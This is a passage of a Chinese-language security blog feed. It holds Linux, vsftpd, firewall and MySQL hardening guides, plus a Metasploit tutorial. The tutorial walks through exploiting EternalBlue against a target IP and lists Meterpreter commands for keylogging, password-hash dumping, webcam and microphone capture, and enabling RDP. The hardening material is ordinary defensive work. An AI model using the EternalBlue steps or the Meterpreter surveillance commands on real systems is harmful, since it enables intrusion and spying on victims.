class="fas fa-link"></i></a><a href="#vsFTPd禁止匿名用户上传；" class="headerlink" title="vsFTPd禁止匿名用户上传；"></a>vsFTPd禁止匿名用户上传；</h3>      <p>修改svsftpd服务配置文件，</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br></pre></td></tr></table></div></figure><p>将 anon_upload_enable 注释取消，并将值改为 NO, 并重启vsftpd服务</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart vsftpd</span><br></pre></td></tr></table></div></figure><p><img src="/images/2/1639105315844.png" alt="1639105315844"></p></li><li>        <h3 id="激活-vsFTPd-上传下载日志；"   >          <a href="#激活-vsFTPd-上传下载日志；" class="heading-link"><i class="fas fa-link"></i></a><a href="#激活-vsFTPd-上传下载日志；" class="headerlink" title="激活 vsFTPd 上传下载日志；"></a>激活 vsFTPd 上传下载日志；</h3>      <p>修改svsftpd服务配置文件，</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br></pre></td></tr></table></div></figure><p>将 xferlog_enable 的值设置为 YES, 并重启vsFTPd服务.</p><p><img src="/images/2/1639105482352.png" alt="1639105482352"></p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启用改选项，系统会记录上传下载的日志。默认情况下，日志文件为 /var/log/vsftpd.log</span></span><br></pre></td></tr></table></div></figure></li><li>        <h3 id="vsFTPd-同一个IP只能连接两个；"   >          <a href="#vsFTPd-同一个IP只能连接两个；" class="heading-link"><i class="fas fa-link"></i></a><a href="#vsFTPd-同一个IP只能连接两个；" class="headerlink" title="vsFTPd 同一个IP只能连接两个；"></a>vsFTPd 同一个IP只能连接两个；</h3>      <p>修改vsftpd服务配置文件，</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br></pre></td></tr></table></div></figure><p>在文件底部新增一行 ，并重启vsFTPd 服务.</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max_per_ip=2</span><br></pre></td></tr></table></div></figure><p><img src="/images/2/1639105608227.png" alt="1639105608227"></p></li><li>        <h3 id="vsFTPd-将使客户端连接时的端口范围在-50000-和-60000-之间；"   >          <a href="#vsFTPd-将使客户端连接时的端口范围在-50000-和-60000-之间；" class="heading-link"><i class="fas fa-link"></i></a><a href="#vsFTPd-将使客户端连接时的端口范围在-50000-和-60000-之间；" class="headerlink" title="vsFTPd 将使客户端连接时的端口范围在 50000 和 60000 之间；"></a>vsFTPd 将使客户端连接时的端口范围在 50000 和 60000 之间；</h3>      <p>修改vsftpd服务配置文件，</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br></pre></td></tr></table></div></figure><p>在文件底部新增两行，并重启vsFTPd服务</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pasv_min_port=50000</span><br><span class="line">pasv_max_port=60000</span><br></pre></td></tr></table></div></figure><p><img src="/images/2/1639105846501.png" alt="1639105846501"></p></li><li>        <h3 id="vsFTPd-使本地用户登录活动范围限制在home目录；"   >          <a href="#vsFTPd-使本地用户登录活动范围限制在home目录；" class="heading-link"><i class="fas fa-link"></i></a><a href="#vsFTPd-使本地用户登录活动范围限制在home目录；" class="headerlink" title="vsFTPd 使本地用户登录活动范围限制在home目录；"></a>vsFTPd 使本地用户登录活动范围限制在home目录；</h3>      <p>修改vsftpd服务配置文件，</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br></pre></td></tr></table></div></figure><p>取消 chroot_local_user 和 chroot_list_enable 的注释，</p><p>将 chroot_local_user 和 chroot_list_enable 的值分别改为 YES 和 NO</p><p><img src="/images/2/1639106108556.png" alt="1639106108556"></p></li></ol>        <h2 id="防火墙策略"   >          <a href="#防火墙策略" class="heading-link"><i class="fas fa-link"></i></a><a href="#防火墙策略" class="headerlink" title="防火墙策略"></a>防火墙策略</h2>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启防火墙，为防止勒索病毒攻击对防火墙进行加固策略</span></span><br></pre></td></tr></table></div></figure><ol><li>        <h3 id="Linux-系统禁用23端口；"   >          <a href="#Linux-系统禁用23端口；" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux-系统禁用23端口；" class="headerlink" title="Linux 系统禁用23端口；"></a>Linux 系统禁用23端口；</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#firewall</span></span><br><span class="line">firewall-cmd --permanent --remove-port=23/tcp</span><br><span class="line">firewall-cmd --reload <span class="comment">#重启防火墙</span></span><br><span class="line"><span class="comment">#iptables</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 23 -j DROP</span><br></pre></td></tr></table></div></figure><p><img src="/images/2/1639106540789.png" alt="1639106540789"></p><p><img src="/images/2/1639106626537.png" alt="1639106626537"></p></li><li>        <h3 id="Linux-系统禁止别人ping通；"   >          <a href="#Linux-系统禁止别人ping通；" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux-系统禁止别人ping通；" class="headerlink" title="Linux 系统禁止别人ping通；"></a>Linux 系统禁止别人ping通；</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#firewall</span></span><br><span class="line">firewall-cmd --permanent --add-rich-rule=<span class="string">&#x27;rule protocol value=icmp drop&#x27;</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"><span class="comment">#iptables</span></span><br><span class="line">iptables -A INPUT -t icmp -j DROP</span><br></pre></td></tr></table></div></figure><p><img src="/images/2/1639106898890.png" alt="1639106898890"></p><p><img src="/images/2/1639106946361.png" alt="1639106946361"></p></li><li>        <h3 id="Linux-系统为确保安全禁止所有人连接-ssh-除了-192-168-1-1-这个IP"   >          <a href="#Linux-系统为确保安全禁止所有人连接-ssh-除了-192-168-1-1-这个IP" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux-系统为确保安全禁止所有人连接-ssh-除了-192-168-1-1-这个IP" class="headerlink" title="Linux 系统为确保安全禁止所有人连接 ssh 除了 192.168.1.1 这个IP."></a>Linux 系统为确保安全禁止所有人连接 ssh 除了 192.168.1.1 这个IP.</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#firewall</span></span><br><span class="line">firewall-cmd --permanent --remove-service=ssh</span><br><span class="line">firewall-cmd --add-rich-rule=<span class="string">&#x27;rule family=&quot;ipv4&quot; source address=&quot;192.168.1.1&quot; port protocol=&quot;tcp&quot; port=&quot;22&quot; accept&#x27;</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"><span class="comment">#iptables</span></span><br><span class="line">iptables -F</span><br><span class="line">iptables -I INPUT -p tcp --dport 22 -j DROP</span><br><span class="line">iptables -I INPUT -s 192.168.1.1 -p tcp --dport 22 -j ACCEPT</span><br></pre></td></tr></table></div></figure><p><img src="/images/2/1639107547783.png" alt="1639107547783"></p><p><img src="/images/2/1639107643160.png" alt="1639107643160"></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;服务加固&quot;   &gt;
          &lt;a href=&quot;#服务加固&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;a href=&quot;#服务加固&quot; class=&quot;headerlink&quot; title=&quot;服务加固&quot;&gt;&lt;/a&gt;服务加固&lt;/h2&gt;
      &lt;ol&gt;
&lt;li&gt;
        &lt;h3 id=&quot;为了防止密码再登录或者传输信息中被窃取仅使用证书登录SSH&quot;   &gt;
          &lt;a href=&quot;#为了防止密码再登录或者传输信息中被窃取仅使用证书登录SSH&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;a href=&quot;#为了防止密码再登录或者传输信息中被窃取仅使用证书登录SSH&quot; class=&quot;headerlink&quot; title=&quot;为了防止密码再登录或者传输信息中被窃取仅使用证书登录SSH&quot;&gt;&lt;/a&gt;为了防止密码再登录或者传输信息中被窃取仅使用证书登录SSH&lt;/h3&gt;
      &lt;p&gt;修改ssh服务配置文件，&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;div class=&quot;table-container&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;vim /etc/ssh/sshd_config&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;

&lt;p&gt;取消 PubkeyAuthentication 注释（如适用），将值改为yes，并将 PasswordAuthentication 的值改为no&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2/1639104393412.png&quot; alt=&quot;1639104393412&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2/1639104432169.png&quot; alt=&quot;1639104432169&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后重启ssh服务&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;div class=&quot;table-container&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systemctl restart sshd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Linux安全加固" scheme="http://example.com/categories/Linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
    
    <category term="安全加固" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>CentOS 下的Mysql数据库安全加固</title>
    <link href="http://example.com/2021/12/09/mysql/"/>
    <id>http://example.com/2021/12/09/mysql/</id>
    <published>2021-12-09T02:40:52.000Z</published>
    <updated>2021-12-14T00:31:09.041Z</updated>
    
    <content type="html"><![CDATA[<ol><li>        <h2 id="以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；"   >          <a href="#以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；" class="heading-link"><i class="fas fa-link"></i></a><a href="#以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；" class="headerlink" title="以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；"></a><strong>以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；</strong></h2>      <p>修改Mysql配置文本</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br></pre></td></tr></table></div></figure><p>在 [mysqld] 下方新增一行 user=mysql (如果没有 mysql 用户需要自行创建)</p><p>修改完后重启Mysql服务</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysqld restart</span><br></pre></td></tr></table></div></figure><p><img src="/images/1639019584959.png" alt="1639019584959"></p><span id="more"></span></li><li>        <h2 id="删除默认数据库-test-；"   >          <a href="#删除默认数据库-test-；" class="heading-link"><i class="fas fa-link"></i></a><a href="#删除默认数据库-test-；" class="headerlink" title="删除默认数据库(test)；"></a><strong>删除默认数据库(test)；</strong></h2>      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database test;</span><br></pre></td></tr></table></div></figure><p><img src="/images/1639020647125.png" alt="1639020647125"></p><ol start="3"><li>        <h2 id="改变默认Mysql管理员用户为SuperRoot；"   >          <a href="#改变默认Mysql管理员用户为SuperRoot；" class="heading-link"><i class="fas fa-link"></i></a><a href="#改变默认Mysql管理员用户为SuperRoot；" class="headerlink" title="改变默认Mysql管理员用户为SuperRoot；"></a><strong>改变默认Mysql管理员用户为SuperRoot；</strong></h2>      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   use mysql</span><br><span class="line">   update user set user=&#x27;SuperRoot&#x27; where user=&#x27;root&#x27;;</span><br><span class="line">   select user,host from user;</span><br><span class="line">flush privileges; #刷新权限</span><br></pre></td></tr></table></div></figure><p><img src="/images/1639030171520.png" alt="1639030171520"></p><p><img src="/images/1639030360591.png" alt="1639030360591"></p></li><li>        <h2 id="使用Mysql内置MD5加密函数加密用户user1的密码为-P-ssw0rd1"   >          <a href="#使用Mysql内置MD5加密函数加密用户user1的密码为-P-ssw0rd1" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用Mysql内置MD5加密函数加密用户user1的密码为-P-ssw0rd1" class="headerlink" title="使用Mysql内置MD5加密函数加密用户user1的密码为(P@ssw0rd1!);"></a><strong>使用Mysql内置MD5加密函数加密用户user1的密码为(P@ssw0rd1!);</strong></h2>      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line">select host,user,password from user;</span><br><span class="line">update user set password=password(md5(&#x27;P@ssw0rd1!&#x27;)) where user=&#x27;user1&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></div></figure><p><img src="/images/1639032216420.png" alt="1639032216420"></p><p><img src="/images/1639032264925.png" alt="1639032264925"></p></li><li>        <h2 id="赋予user用户对数据库所有表只有select-insert-delete-update权限；"   >          <a href="#赋予user用户对数据库所有表只有select-insert-delete-update权限；" class="heading-link"><i class="fas fa-link"></i></a><a href="#赋予user用户对数据库所有表只有select-insert-delete-update权限；" class="headerlink" title="赋予user用户对数据库所有表只有select,insert,delete,update权限；"></a>赋予user用户对数据库所有表只有select,insert,delete,update权限；</h2>      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#查看权限</span><br><span class="line">show grants for &#x27;user1&#x27;@&#x27;localhost&#x27;;</span><br><span class="line">#修改权限</span><br><span class="line">grant select,insert,delete,update on *.* to &#x27;user1&#x27;@&#x27;localhost&#x27;;</span><br><span class="line">#刷新权限</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></div></figure><p><img src="/images/1639034859402.png" alt="1639034859402"></p><p><img src="/images/1639034904356.png" alt="1639034904356"></p></li><li>        <h2 id="对忘记Mysql数据库SuperRoot管理员密码进行重置操作；"   >          <a href="#对忘记Mysql数据库SuperRoot管理员密码进行重置操作；" class="heading-link"><i class="fas fa-link"></i></a><a href="#对忘记Mysql数据库SuperRoot管理员密码进行重置操作；" class="headerlink" title="对忘记Mysql数据库SuperRoot管理员密码进行重置操作；"></a>对忘记Mysql数据库SuperRoot管理员密码进行重置操作；</h2>      <p>先修改Mysql配置文本my.cnf</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br></pre></td></tr></table></div></figure><p>在[mysqld]下方新增一行 skip_grant_tables， 然后保存并退出，重启Mysql服务</p><p>直接输入mysql，即可不用密码登录数据库</p><p>进入后修改mysql数据库中的user表，用UPDATE编辑user表</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line">update user set password=&#x27;abc123!&#x27; where user=&#x27;SuperRoot&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></div></figure><p><img src="/images/1639035319098.png" alt="1639035319098"></p><p><img src="/images/1639035421665.png" alt="1639035421665"></p><p><img src="/images/1639035606912.png" alt="1639035606912"></p><p>然后退出mysql，删除my.cnf中刚刚插入的skip_grant_tables,重启Mysql服务，再使用新的密码登录Mysql</p><p><img src="/images/1639035954404.png" alt="1639035954404"></p></li><li>        <h2 id="禁用LOCAL-INFILE-命令防止非授权用户访问本地文件；"   >          <a href="#禁用LOCAL-INFILE-命令防止非授权用户访问本地文件；" class="heading-link"><i class="fas fa-link"></i></a><a href="#禁用LOCAL-INFILE-命令防止非授权用户访问本地文件；" class="headerlink" title="禁用LOCAL INFILE 命令防止非授权用户访问本地文件；"></a>禁用LOCAL INFILE 命令防止非授权用户访问本地文件；</h2>      <p>修改Mysql配置文本my.cnf</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br></pre></td></tr></table></div></figure><p>在[mysqld]下添加一行代码</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local-infile=0</span><br></pre></td></tr></table></div></figure><p><img src="/images/1639050657283.png" alt="1639050657283"></p></li><li>        <h2 id="为防止数据库操作信息泄露，请禁止使用Mysql命令行历史记录；"   >          <a href="#为防止数据库操作信息泄露，请禁止使用Mysql命令行历史记录；" class="heading-link"><i class="fas fa-link"></i></a><a href="#为防止数据库操作信息泄露，请禁止使用Mysql命令行历史记录；" class="headerlink" title="为防止数据库操作信息泄露，请禁止使用Mysql命令行历史记录；"></a>为防止数据库操作信息泄露，请禁止使用Mysql命令行历史记录；</h2>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先删除历史记录文件(如果存在)</span></span><br><span class="line">rm -rf <span class="variable">$HOME</span>/.mysql_history</span><br><span class="line"><span class="comment">#将MYSQL_HISTORY变量设为/dev/null</span></span><br><span class="line">ln -s /dev/null <span class="variable">$HOME</span>/.mysql_history</span><br></pre></td></tr></table></div></figure></li><li>        <h2 id="为了分析数据库运行过程中的一些异常活动，请开启Mysql二进制日志。"   >          <a href="#为了分析数据库运行过程中的一些异常活动，请开启Mysql二进制日志。" class="heading-link"><i class="fas fa-link"></i></a><a href="#为了分析数据库运行过程中的一些异常活动，请开启Mysql二进制日志。" class="headerlink" title="为了分析数据库运行过程中的一些异常活动，请开启Mysql二进制日志。"></a>为了分析数据库运行过程中的一些异常活动，请开启Mysql二进制日志。</h2>      <p>修改mysql配置文件my.cnf，</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br></pre></td></tr></table></div></figure><p>在[mysqld]下方添加一行代码</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log-bin=mysql-bin</span><br></pre></td></tr></table></div></figure><p><img src="/images/1639050085039.png" alt="1639050085039"></p><p>修改完后重启Mysql服务，进入数据库，</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看Mysql的二进制日志是否开启</span><br><span class="line">show variables like &#x27;%log_bin%&#x27;;</span><br></pre></td></tr></table></div></figure><p><img src="/images/1639051256549.png" alt="1639051256549"></p></li></ol></li></ol>]]></content>
    
    
    <summary type="html">&lt;ol&gt;
&lt;li&gt;
        &lt;h2 id=&quot;以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；&quot;   &gt;
          &lt;a href=&quot;#以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;a href=&quot;#以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；&quot; class=&quot;headerlink&quot; title=&quot;以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；&quot;&gt;&lt;/a&gt;&lt;strong&gt;以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；&lt;/strong&gt;&lt;/h2&gt;
      &lt;p&gt;修改Mysql配置文本&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;div class=&quot;table-container&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;vim /etc/my.cnf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;

&lt;p&gt;在 [mysqld] 下方新增一行 user=mysql (如果没有 mysql 用户需要自行创建)&lt;/p&gt;
&lt;p&gt;修改完后重启Mysql服务&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;div class=&quot;table-container&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;service mysqld restart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/1639019584959.png&quot; alt=&quot;1639019584959&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Linux安全加固" scheme="http://example.com/categories/Linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
    
    <category term="安全加固" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>Msfconsole</title>
    <link href="http://example.com/2021/11/15/Msfconsole/"/>
    <id>http://example.com/2021/11/15/Msfconsole/</id>
    <published>2021-11-15T00:55:36.000Z</published>
    <updated>2021-12-14T00:30:28.175Z</updated>
    
    <content type="html"><![CDATA[        <h2 id="Msfconsole"   >          <a href="#Msfconsole" class="heading-link"><i class="fas fa-link"></i></a><a href="#Msfconsole" class="headerlink" title="Msfconsole"></a>Msfconsole</h2>      <p><strong>Msfconsole初始化参数：</strong></p><p>-E、 –环境环境设置Rails环境，默认为RAIL_ENV环境变量或“production”</p><p>-M、 –迁移路径目录指定包含其他数据库迁移的目录</p><p>-n、 –无数据库禁用数据库支持</p><p>-y、 –yaml PATH指定包含数据库设置的yaml文件</p><span id="more"></span><p>-c文件加载指定的配置文件</p><p>-v、 -v，–version显示版本</p><p>–defer-module-loads –延迟模块加载延迟模块加载，除非明确要求</p><p>-m、 –模块路径目录加载其他模块路径</p><p>-a、 –退出Metasploit前询问或接受“退出-y”</p><p>-H、 –历史记录文件将命令历史记录保存到指定文件</p><p>-l、 –记录器字符串指定要使用的记录器（Flatfile、StdoutWithoutTimestamps、Stderr、Stdout</p><p>z`TimestampColorlessFlatfile）</p><p>-L,   –real readline使用系统readline库而不是RbReadline</p><p>-o、 –输出文件输出到指定的文件</p><p>-p、 –插件启动时加载插件</p><p>-q、 –启动时不要打印横幅</p><p>-r、 –资源文件执行指定的资源文件（-for stdin）</p><p>-x、 –执行命令执行指定的控制台命令（使用；多个）</p><p><strong>Msfconsole启动后参数：</strong></p><p>advanced      高级显示一个或多个模块的高级选项</p><p>back              后退从当前上下文向后移动</p><p>clearm           clearm清除模块堆栈</p><p>favorite          收藏夹将模块添加到收藏夹模块列表中</p><p>info                信息显示有关一个或多个模块的信息</p><p>listm               列出模块堆栈</p><p>loadpath         从路径中搜索并加载模块</p><p>options           选项显示一个或多个模块的全局选项或</p><p>popm             将最新模块从堆栈中弹出并使其处于活动状态</p><p>previous        将以前加载的模块设置为当前模块</p><p>pushm           将活动或模块列表推送到模块堆栈上</p><p>reload_all      重新加载\u all从所有定义的模块路径重新加载所有模块</p><p>search          搜索模块名称和描述</p><p>show            显示显示给定类型的模块或所有模块</p><p>use               使用“按名称或搜索词/索引与模块交互”</p><p><strong>常用模块解释：</strong></p><p>search 搜索列举相关模块</p><p><img src="/images/msfc1.png"></p><p>use 选择相关模块</p><p><img src="/images/msfc2.png"></p><p>show options 显示模块的相关参数</p><p><img src="/images/msfc3.png"></p><p>back 退出当前模块</p><p><img src="/images/msfc4.png"></p><p>set 用来设置选择模块后的载荷</p><p><img src="/images/msfc5.png"></p><p>run和exploit运行当前模块</p><p><img src="/images/msfc6.png"></p><p><strong>利用永恒之蓝进行简单的一次渗透：</strong></p><p>启动软件：</p><p><img src="/images/msfc7.png"></p><p>搜索Ms17_010模块并选择：</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">格式：search </span><br><span class="line">格式：use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></div></figure><p><img src="/images/msfc9.png"></p><p>列出当前选择模块的可用内容：</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：show options</span><br></pre></td></tr></table></div></figure><p><img src="/images/msfc8.png"></p><p>利用set设置上面显示内容的RHOSTS 指定要攻击的电脑IP</p><p><img src="/images/msfc10.png"></p><p>输入run或exploit运行当前模块，拿到控制台</p><p><img src="/images/msfc11.png"></p><p><img src="/images/msfc12.png"></p><p><strong>Meterpreter命令：</strong></p><p>cat /路径/ 查看文件内容</p><p>del /路径/ 删除指定内容</p><p>upload /路径/ 上传文件到目标主机</p><p>download /路径/ 下载目标主机文件到本地主机</p><p>pwd 查看当前所在路径</p><p>mv 修改目标主机上的文件名</p><p>keyscan_start 开启键盘记录功能</p><p>keyscan_dump 显示捕捉到的键盘记录信息</p><p>keyscan_stop 停止键盘记录功能</p><p>reboot 重启目标主机</p><p>shell 拿到cmd</p><p>sysinfo 查看目标主机信息</p><p>hashdump 获取目标主机用户名的hash值</p><p>vnc 远程桌面</p><p>record_mic 音频录制</p><p>webcam_chat 查看摄像头接口</p><p>webcam_list 查看摄像头列表</p><p>webcam_stream 摄像头获取</p><p>keylogrecorder 记录键盘信息</p><p>run post/windows/manage/enable_rdp 开启目标远程3389</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Msfconsole&quot;   &gt;
          &lt;a href=&quot;#Msfconsole&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;a href=&quot;#Msfconsole&quot; class=&quot;headerlink&quot; title=&quot;Msfconsole&quot;&gt;&lt;/a&gt;Msfconsole&lt;/h2&gt;
      &lt;p&gt;&lt;strong&gt;Msfconsole初始化参数：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;-E、 –环境环境设置Rails环境，默认为RAIL_ENV环境变量或“production”&lt;/p&gt;
&lt;p&gt;-M、 –迁移路径目录指定包含其他数据库迁移的目录&lt;/p&gt;
&lt;p&gt;-n、 –无数据库禁用数据库支持&lt;/p&gt;
&lt;p&gt;-y、 –yaml PATH指定包含数据库设置的yaml文件&lt;/p&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透工具" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
